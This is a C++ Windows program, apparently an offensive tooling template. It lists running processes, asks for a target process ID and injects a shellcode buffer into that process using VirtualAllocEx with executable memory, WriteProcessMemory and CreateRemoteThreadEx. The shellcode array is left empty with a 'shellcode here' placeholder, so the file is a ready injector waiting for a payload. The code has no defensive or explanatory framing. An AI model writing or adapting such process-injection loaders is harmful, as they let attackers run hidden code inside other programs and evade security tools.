#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>

using namespace std;

void printProcessNameAndID(DWORD processID) {
    TCHAR szProcessName[MAX_PATH] = TEXT("<uinknown>");

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);

    if (NULL != hProcess) {
        HMODULE hMod;
        DWORD cbNeeded;

        if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
            GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(TCHAR));
        }
    }

    _tprintf(TEXT("%s  (PID: %u)\n"), szProcessName, processID);

    CloseHandle(hProcess);
}

int findProcess() {
    DWORD aProcesses[1024], cbNeeded, cProcesses;
    unsigned int i;

    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
        return 1;
    }

    cProcesses = cbNeeded / sizeof(DWORD);

    for (i = 0; i < cProcesses; i++) {
        if (aProcesses[i] != 0) {
            printProcessNameAndID(aProcesses[i]);
        }
    }

    return 0;
}

void inject(DWORD pid) {
    unsigned char wannabe[] =
        ""; //shellcode here
    HANDLE hProcess;
    DWORD dwProcessId = pid;

    hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwProcessId);

    if (hProcess == NULL) {
        cout << "\nUnable to Identify the Process ID\n";
        return;
    }

    SIZE_T dwSize = sizeof(wannabe);
    DWORD flAllocationType = (MEM_COMMIT | MEM_RESERVE);
    DWORD flProtect = PAGE_EXECUTE_READWRITE;

    LPVOID lpAlloc = VirtualAllocEx(hProcess, NULL, dwSize, flAllocationType, flProtect);
    if (lpAlloc == NULL) {
        printf("\nFailed to Allocate the memory\n");
        DWORD dwError = GetLastError();
        printf("Error Code: %lu\n", dwError);
        CloseHandle(hProcess);
        return;
    }
    printf("Allocated the memory into virtual space\n");

    LPVOID lpBaseAddress = lpAlloc;
    LPCVOID lpBuffer = wannabe;
    SIZE_T nSize = sizeof(wannabe);
    SIZE_T lpNumberOfBytesWritten;

    BOOL bWriteBuffer = WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, &lpNumberOfBytesWritten);

    if (bWriteBuffer == FALSE) {
        DWORD dwError = GetLastError();
        printf("Failed to Write Memory to the process. Error Code: %lu\n", dwError);
        CloseHandle(hProcess);
        return;
    }

    printf("Successfully wrote memory to the process\n");

    LPSECURITY_ATTRIBUTES lpThreadAttributes = NULL;
    SIZE_T dwStackSize = 0;
    LPTHREAD_START_ROUTINE lpStartAddress = (LPTHREAD_START_ROUTINE)lpAlloc;
    LPVOID lpParameter = NULL;
    DWORD dwCreationFlags = 0;
    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList = 0;
    LPDWORD lpThreadId = NULL;


    HANDLE hThread = CreateRemoteThreadEx(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpAttributeList, lpThreadId);

    if (hThread == NULL) {
        DWORD dwError = GetLastError();
        printf("Failed to create remote thread. Error Code: %lu\n", dwError);
        CloseHandle(hProcess);
        return;
    }

    WaitForSingleObject(hThread, INFINITE);

    printf("Successfully injected into process %lu\n", pid);

    CloseHandle(hThread);
    CloseHandle(hProcess);
}

int main() {
    findProcess();

    DWORD pid;
    cout << "Enter process ID: ";
    cin >> pid;

    inject(pid);
}